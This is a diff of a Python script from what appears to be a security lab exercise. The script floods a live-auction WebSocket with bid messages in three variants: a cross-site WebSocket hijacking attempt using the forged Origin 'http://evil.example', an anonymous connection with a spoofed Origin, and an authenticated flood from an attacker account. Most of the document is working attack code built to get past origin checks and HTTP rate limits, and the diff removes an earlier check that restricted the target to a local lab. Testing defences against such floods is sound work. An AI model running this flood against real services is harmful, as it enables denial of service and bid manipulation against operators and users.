@@ -1,63 +1,62 @@
-"""Round 4 attack — WebSocket flood from a cross-site origin.
+"""
+Round 4 attack: WebSocket bid flood, three ways.
 
-Open one WebSocket to the live-drop feed and send bid messages as fast as
-possible. Over a single connection this is invisible to any HTTP rate limiter.
-The connection also carries a forged ``Origin`` of another site and no auth
-token, modelling cross-site WebSocket hijacking (CSWSH): a browser on a page the
-victim visits would open exactly this socket.
+Open one WebSocket to the live-drop feed and send bid messages as fast as possible. Over a single connection this
+is invisible to any HTTP rate limiter: it is one request. Three variants, each beating the control before it:
 
-At DEFENSE_LEVEL<4 every message is accepted — the flood lands. At
-DEFENSE_LEVEL=4 the handshake is refused on Origin, or (if you allow anonymous
-read) the per-connection bucket throttles and then closes the connection, and
-unauthenticated bids are rejected.
+  cswsh      a forged ``Origin`` of another site and no token: cross-site WebSocket hijacking, as a browser on a
+             page the victim visits would open it. The Origin check stops it at the handshake.
+  anon       the attacker is not a browser and simply sets ``Origin`` to our own (``--origin-ok``): it passes the
+             Origin check, still has no token. The bids are state-changing, so they need authentication.
+  authed     the attacker logs in with an account of their own (``--origin-ok --login``) and floods with a valid
+             token: nothing but a per-connection message budget stops this one.
+
+At DEFENSE_LEVEL<4 every message is accepted - the flood lands. At level 4 the handshake is refused on Origin,
+the bids are rejected, or the bucket empties and the server hangs up.
+
+    python attacks/round4_ws_flood.py [--origin-ok] [--login]
 """
 
-from __future__ import annotations
-
-import json
+import argparse
 import time
 
-from websockets.sync.client import connect
+from _common import BASE_URL, SCRIPT_UA, ApiApp, bid, bot_ip, finish, open_feed
 
-from _common import BASE_URL, DATACENTER_IP, require_local_target, ws_url
+ACTOR = "bot:r4_ws"
+MALLORY = ("mallory@example.test", "mallory-owns-this-1")      # the attacker's own account (contract seed data)
 
-ACTOR = "bot-r4"
 
-
-def run(base: str = BASE_URL, n: int = 200) -> dict:
-    require_local_target(base)
-    extra = {"Origin": "http://evil.example", "X-Lab-Actor": ACTOR,
-             "X-Lab-Egress": DATACENTER_IP, "User-Agent": "python-websockets/attack"}
-    sent = accepted = errors = 0
+def run(origin_ok=False, login=False, n=200):
+    variant = "authed" if login else ("anon" if origin_ok else "cswsh")
+    ip = bot_ip(3)
+    token = None
+    if login:
+        app = ApiApp(ACTOR, ip, ua=SCRIPT_UA)
+        app.login(*MALLORY)
+        token = app.token
+    sent = accepted = 0
     connected = False
     t0 = time.perf_counter()
     try:
-        with connect(ws_url(), additional_headers=extra, open_timeout=5) as ws:
+        with open_feed(ACTOR, ip, origin=BASE_URL if origin_ok else "http://evil.example", token=token, ua=SCRIPT_UA) as ws:
             connected = True
-            for i in range(n):
-                try:
-                    ws.send(json.dumps({"action": "bid", "item_id": 42, "amount": 1.0}))
-                    sent += 1
-                    reply = json.loads(ws.recv(timeout=5))
-                    if reply.get("event") == "bid_ack":
-                        accepted += 1
-                    else:
-                        errors += 1
-                except Exception:
-                    errors += 1
-                    break
+            for _ in range(n):
+                reply = bid(ws)
+                sent += 1
+                if reply is None:
+                    break                                    # the server hung up
+                if reply.get("event") == "bid_ack":
+                    accepted += 1
     except Exception:
-        connected = False
+        connected = connected and sent > 0
     elapsed = time.perf_counter() - t0
-    rate = round(accepted / elapsed, 1) if elapsed else 0.0
-    return {"actor": ACTOR, "connected": connected, "sent": sent, "accepted": accepted,
-            "rejected": errors, "elapsed_s": round(elapsed, 2), "accepted_per_s": rate}
+    return finish(f"round4_{variant}", n, accepted, "bids accepted", variant=variant, connected=connected, sent=sent,
+                  elapsed_s=round(elapsed, 2), accepted_per_s=round(accepted / elapsed, 1) if elapsed else 0.0)
 
 
 if __name__ == "__main__":
-    s = run()
-    if not s["connected"]:
-        print("[round4] handshake refused (origin/auth) — flood never started")
-    else:
-        print(f"[round4] connected; {s['accepted']}/{s['sent']} bids accepted "
-              f"({s['accepted_per_s']}/s), {s['rejected']} rejected")
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--origin-ok", action="store_true")
+    ap.add_argument("--login", action="store_true")
+    a = ap.parse_args()
+    run(a.origin_ok or a.login, a.login)
